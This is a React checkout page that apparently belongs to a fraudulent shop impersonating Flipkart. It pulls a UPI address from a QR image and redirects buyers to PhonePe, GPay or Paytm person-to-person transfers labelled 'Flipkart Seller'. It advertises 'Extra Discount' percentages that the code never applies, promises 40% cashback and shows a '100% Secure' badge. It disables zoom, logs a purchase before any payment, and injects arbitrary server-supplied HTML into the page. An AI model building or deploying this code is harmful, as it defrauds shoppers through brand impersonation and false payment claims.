import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { localService } from "../services/localService";
import jsQR from "jsqr";

// ======================= HELPERS =======================
function toBase64(str) {
  return btoa(
    encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode("0x" + p1)
    )
  );
}

function createPhonePeDeepLink(vpa, amountInRupees, note = "") {
  amountInRupees = Number(amountInRupees);
  if (typeof vpa !== "string" || vpa.trim() === "") throw new Error("Invalid VPA");
  if (isNaN(amountInRupees) || amountInRupees <= 0) throw new Error("Invalid Amount");

  const initialAmount = Math.round(amountInRupees * 100);
  const payload = {
    contact: {
      cbcName: "",
      nickName: "",
      vpa: vpa,
      type: "VPA",
    },
    p2pPaymentCheckoutParams: {
      note: note.substring(0, 100),
      isByDefaultKnownContact: true,
      initialAmount: initialAmount,
      currency: "INR",
      checkoutType: "DEFAULT",
      transactionContext: "p2p",
    },
  };
  const json = JSON.stringify(payload);
  const base64 = toBase64(json);
  const encoded = encodeURIComponent(base64);
  return `phonepe://native?data=${encoded}&id=p2ppayment`;
}

const DISCOUNTS = { phonepe: 0.0, gpay: 0.0, paytm: 0.0 };

// ======================= COMPONENT =======================
const Payment = () => {
  const navigate = useNavigate();
  const [product, setProduct] = useState(null);
  const [selectedMethod, setSelectedMethod] = useState("");
  const [settings, setSettings] = useState({
    show_gpay: false,
    show_phonepe: false,
    show_paytm: false,
    upi: "",
    pay_type: false,
    payment_script: "",
  });

  const timeoutRef = useRef(null);

  // ---------- DISABLE ZOOM & PINCH ----------
  useEffect(() => {
    const viewportMeta = document.querySelector('meta[name="viewport"]');
    let originalContent = "";
    if (viewportMeta) {
      originalContent = viewportMeta.getAttribute("content") || "";
      viewportMeta.setAttribute(
        "content",
        "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
      );
    } else {
      const meta = document.createElement("meta");
      meta.name = "viewport";
      meta.content =
        "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no";
      document.head.appendChild(meta);
    }

    const preventPinch = (e) => {
      if (e.touches && e.touches.length > 1) e.preventDefault();
    };
    const preventGesture = (e) => e.preventDefault();

    document.addEventListener("touchmove", preventPinch, { passive: false });
    document.addEventListener("gesturestart", preventGesture);
    document.addEventListener("gesturechange", preventGesture);
    document.addEventListener("gestureend", preventGesture);

    return () => {
      if (viewportMeta) viewportMeta.setAttribute("content", originalContent);
      else document.querySelector('meta[name="viewport"]')?.remove();
      document.removeEventListener("touchmove", preventPinch);
      document.removeEventListener("gesturestart", preventGesture);
      document.removeEventListener("gesturechange", preventGesture);
      document.removeEventListener("gestureend", preventGesture);
    };
  }, []);

  // ---------- Load product & settings ----------
  const loadData = () => {
    try {
      const checkoutCart = localStorage.getItem("checkout_cart");

      if (checkoutCart) {
        const cartItems = JSON.parse(checkoutCart);

        const totalAmount = cartItems.reduce(
          (sum, item) =>
            sum +
            (Number(item.selling_price || 0) *
              Number(item.qty || 1)),
          0
        );

        const totalMrp = cartItems.reduce(
          (sum, item) =>
            sum +
            (Number(item.mrp || 0) *
              Number(item.qty || 1)),
          0
        );

        setProduct({
          name: `${cartItems.length} Item(s)`,
          selling_price: totalAmount,
          mrp: totalMrp,
          qty: cartItems.reduce(
            (sum, item) => sum + (Number(item.qty) || 1),
            0
          ),
        });
      } else {
        const cartRaw = localStorage.getItem("cart_items");

        if (cartRaw) {
          const cartItems = JSON.parse(cartRaw);

          if (Array.isArray(cartItems) && cartItems.length > 0) {
            const totalAmount = cartItems.reduce(
              (sum, item) =>
                sum +
                (Number(item.selling_price || 0) *
                  Number(item.qty || 1)),
              0
            );

            const totalMrp = cartItems.reduce(
              (sum, item) =>
                sum +
                (Number(item.mrp || 0) *
                  Number(item.qty || 1)),
              0
            );

            setProduct({
              name: `${cartItems.length} Item(s)`,
              selling_price: totalAmount,
              mrp: totalMrp,
              qty: cartItems.reduce(
                (sum, item) => sum + (Number(item.qty) || 1),
                0
              ),
            });
          } else {
            setProduct(null);
          }
        } else {
          setProduct(null);
        }
      }
    } catch (err) {
      console.error("Failed to load cart data:", err);
      setProduct(null);
    }
    localService.getSettings()
      .then((response) => {
        if (response.success) {
          setSettings(response.data);
          const data = response.data;
          if (data.show_phonepe) setSelectedMethod("phonepe");
          else if (data.show_gpay) setSelectedMethod("gpay");
          else if (data.show_paytm) setSelectedMethod("paytm");
        }
      })
      .catch((error) => console.error("Error fetching settings:", error));
  };

  useEffect(() => {
    loadData();

    // Refresh data when user returns to the tab after being backgrounded
    const handleVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        loadData();
      }
    };
    document.addEventListener("visibilitychange", handleVisibilityChange);
    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, []);

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, []);

  // ---------- Meta Pixel ----------
  const trackPurchaseEvent = (amount, product, paymentMethod) => {
    if (typeof window.fbq === "function") {
      window.fbq("track", "Purchase", {
        value: amount,
        currency: "INR",
        content_ids: [product?.id || product?.sku || "N/A"],
        content_name: product?.name || product?.product_name || "Product",
        content_type: "product",
        payment_method: paymentMethod,
      });
    }
  };

  // ---------- Safe rendering ----------
  if (!product) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="text-center">
          <p>Loading product details...</p>
          <button
            onClick={() => navigate(-1)}
            className="mt-4 bg-blue-500 text-white px-4 py-2 rounded"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  const sellingPrice = parseFloat(product.selling_price);
  if (isNaN(sellingPrice)) {
    return (
      <div className="flex justify-center items-center h-screen text-red-500">
        Invalid product price. Please go back and try again.
      </div>
    );
  }

  const getPriceForMethod = (method) => {
    const discount = DISCOUNTS[method] || 0;
    return Math.round(sellingPrice * (1 - discount));
  };
  const displayPrice = getPriceForMethod(selectedMethod || "phonepe");
  const cashbackPrice = Math.round(sellingPrice * 0.4);

  const handlePayment = () => {
    if (!product || !selectedMethod) return;

    const amount = getPriceForMethod(selectedMethod);
    trackPurchaseEvent(amount, product, selectedMethod);

    const img = new Image();

    img.onload = () => {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");

      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const code = jsQR(imageData.data, canvas.width, canvas.height);

      if (!code) {
        alert("QR code not found");
        return;
      }

      const query = code.data.split("?")[1];
      if (!query) {
        alert("Invalid QR code");
        return;
      }

      const params = new URLSearchParams(query);
      const pa = params.get("pa") || "";
      const tr = params.get("tr") || Math.floor(Math.random() * 10000000000);
      const site_name = "Flipkart Seller";

      let redirect_url = "";

      switch (selectedMethod) {
        case "gpay":
          redirect_url = `tez://upi/pay?pa=${pa}&pn=${encodeURIComponent(site_name)}&am=${amount}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${encodeURIComponent(site_name)}`;
          break;
        case "phonepe":
          redirect_url = `phonepe://pay?pa=${pa}&pn=${encodeURIComponent(site_name)}&am=${amount}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${encodeURIComponent(site_name)}`;
          break;
        case "paytm":
          redirect_url = `paytmmp://cash_wallet?pa=${pa}&pn=${encodeURIComponent(site_name)}&am=${amount}&cu=INR&tn=${encodeURIComponent(site_name)}&featuretype=money_transfer&tr=${tr}`;
          break;
        default:
          redirect_url = `upi://pay?pa=${pa}&pn=${encodeURIComponent(site_name)}&am=${amount}&cu=INR&tr=${tr}`;
      }

      if (redirect_url) window.location.href = redirect_url;
    };

    img.onerror = () => alert("rzp.jpg not found in public folder");
    img.src = "/rzp.jpg";
  };

  return (
    <div className="bg-white min-h-screen">
      {/* Header (unchanged) */}
      <div className="container mx-auto min-w-full p-3 pb-0 bg-white sticky top-0 z-50 shadow-sm">
        <div className="flex items-center justify-between">
          <div className="flex items-center mb-4.5 w-full">
            <div className="w-[10%]" onClick={() => navigate(-1)}>
              <img src="/assets/images/theme/back_dark.svg" alt="Back" className="w-5 h-5" />
            </div>
            <div>
              <p className="text-[13px] text-gray-500 mb-0 leading-none">Step 3 of 3</p>
              <h5 className="text-[16px] font-semibold text-gray-800 mt-1 mb-0 leading-tight">Payments</h5>
            </div>
            <div className="flex items-center px-2 md:px-4 justify-center bg-[#f5f5f5] rounded py-1 ml-auto">
              <img src="/assets/images/lock-icon.svg" alt="Secure" className="w-4 h-4" />
              <p className="mb-0 ml-1 text-[10px] md:text-[12px] font-bold text-gray-600 whitespace-nowrap">100% Secure</p>
            </div>
          </div>
        </div>
      </div>

      <div className="bg-white md:mb-15">
        {/* Payment Methods Section */}
        {settings.pay_type ? (
          <div className="m-4 p-4 bg-white rounded-lg shadow-sm border border-gray-100">
            <div dangerouslySetInnerHTML={{ __html: settings.payment_script || "" }} />
          </div>
        ) : (
          <div className="bg-[#f5f5f5] rounded-lg overflow-hidden">
            <div className="p-4 border-b border-gray-100 flex justify-between items-center bg-[#F5F5F5] rounded-t-lg">
              <div className="flex items-center">
                <img src="/assets/images/upi.svg" alt="UPI" className="w-[30px]" />
                <p className="text-[15px] font-medium ml-2 text-gray-700">UPI</p>
              </div>
              <img src="/assets/images/up_arw.png" alt="Arrow" className="w-[18px]" />
            </div>

            <div className="p-2 mb-0.5 shadow-[0px_2px_5px_rgba(0,0,0,0.1)] m-2 bg-white rounded">
              {settings.show_phonepe == 1 && (
                <div className="flex items-center justify-between p-3 mb-2 cursor-pointer" onClick={() => setSelectedMethod("phonepe")}>
                  <div className="flex items-center">
                    <input type="radio" name="upi" checked={selectedMethod === "phonepe"} onChange={() => setSelectedMethod("phonepe")} className="w-5 h-5 mr-3 accent-blue-600" />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span>₹{getPriceForMethod("phonepe")}</span><span className="text-gray-400 font-light">|</span><span>PhonePe</span>
                      </div>
                      <p className="text-[14px] text-[#875BB7] mt-0.5">30% Extra Discount By PhonePe</p>
                    </div>
                  </div>
                  <img src="/assets/images/phonepe.svg" alt="PhonePe" className="w-[30px]" />
                </div>
              )}
              {settings.show_gpay == 1 && (
                <div className="flex items-center justify-between p-3 mb-2 cursor-pointer" onClick={() => setSelectedMethod("gpay")}>
                  <div className="flex items-center">
                    <input type="radio" name="upi" checked={selectedMethod === "gpay"} onChange={() => setSelectedMethod("gpay")} className="w-5 h-5 mr-3 accent-blue-600" />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span>₹{getPriceForMethod("gpay")}</span><span className="text-gray-400 font-light">|</span><span>GPay</span>
                      </div>
                      <p className="text-[14px] text-[#34A853] mt-0.5">20% Extra Discount By Gpay</p>
                    </div>
                  </div>
                  <img src="/assets/images/gpay_icon.svg" alt="GPay" className="w-[30px]" />
                </div>
              )}
              {settings.show_paytm == 1 && (
                <div className="flex items-center justify-between p-3 border-t border-gray-200 cursor-pointer" onClick={() => setSelectedMethod("paytm")}>
                  <div className="flex items-center">
                    <input type="radio" name="upi" checked={selectedMethod === "paytm"} onChange={() => setSelectedMethod("paytm")} className="w-5 h-5 mr-3 accent-blue-600" />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span>₹{getPriceForMethod("paytm")}</span><span className="text-gray-400 font-light">|</span><span>PayTM</span>
                      </div>
                      <p className="text-[14px] text-[#02B9EF] mt-0.5">10% Extra Discount By Paytm</p>
                    </div>
                  </div>
                  <img src="/assets/images/paytm_icon.svg" alt="Paytm" className="w-[30px]" />
                </div>
              )}
            </div>
          </div>
        )}

        {/* Cashback Banner */}
        <div className="bg-[#E7F9ED] rounded-lg p-4 mb-4 text-center m-4 font-medium">
          <div className="flex items-center justify-start mb-2">
            <p className="text-[20px] font-bold text-[#008C00] pb-2 leading-tight">Cashback on First Order!</p>
          </div>
          <div className="text-[14px] text-justify leading-snug -mt-3 w-full max-w-md">
            Place your order and get <span className="font-bold text-gray-900">₹{cashbackPrice}</span> cashback! Cashback will be credited to your original UPI payment method after delivery.
          </div>
        </div>

        {/* Price Breakdown – safe access */}
        <div className="bg-[#F1F5FF] rounded-lg p-3 mb-0 font-medium m-4">
          <div className="flex justify-between py-1 text-[15px]">
            <span>Price ({product.qty || 1} item(s))</span>
            <span>₹ {sellingPrice}</span>
          </div>
          <div className="flex justify-between py-1 text-[15px]">
            <span>Delivery Charges</span>
            <span className="text-[#008C00]">FREE</span>
          </div>
          <div className="flex justify-between py-1 text-[15px]">
            <span>Discount fee</span>
            <span className="line-through text-gray-500">₹ {product.mrp || 0}</span>
          </div>
          <div className="flex justify-between py-3 mt-1 border-t border-dashed border-[#c4c4c4] items-center">
            <div className="flex items-center text-[#2855E9] text-[15px]">
              Total Amount
              <img src="/assets/images/uparrow.png" alt="Arrow" className="w-[10px] h-[10px] ml-2 mt-1" />
            </div>
            <span className="text-[16px] font-bold text-[#2855E9]">₹ {displayPrice}</span>
          </div>
        </div>

        {/* Secure Pay Image */}
        <div className="flex justify-start">
          <img src="/assets/images/SecurePay.jpg" alt="Secure Pay" className="w-full lg:h-100 max-w-sm mb-5 md:mb-25 lg:mb-0 lg:min-w-255" />
        </div>
      </div>

      {/* Mobile Footer */}
      <div className="fixed bottom-0 left-0 w-full bg-white shadow-[0_-1px_5px_rgba(0,0,0,0.1)] p-4 px-6 flex md:hidden z-50 justify-between items-center border-t border-gray-100">
        <div className="flex items-center">
          <span className="text-[24px] font-medium text-[#212121]">₹{displayPrice}</span>
        </div>
        <button className="bg-[#FFC107] text-black font-bold py-3 px-8 rounded-lg shadow-sm uppercase text-[15px] cursor-pointer border-none" onClick={handlePayment}>
          PROCEED TO PAY
        </button>
      </div>

      {/* Desktop Footer */}
      <div className="hidden md:flex fixed bottom-0 w-full bg-white shadow-[0_-2px_10px_rgba(0,0,0,0.1)] p-3 z-50 justify-between items-center mx-auto left-0 right-0">
        <div className="w-[50%] px-2">
          <span className="text-[18px] block leading-none">₹{displayPrice}</span>
        </div>
        <button className="w-[50%] bg-[#FFC107] text-black font-semibold py-3 border-none rounded-sm shadow-sm uppercase text-[14px] cursor-pointer" onClick={handlePayment}>
          PROCEED TO PAY
        </button>
      </div>
    </div>
  );
};

export default Payment;
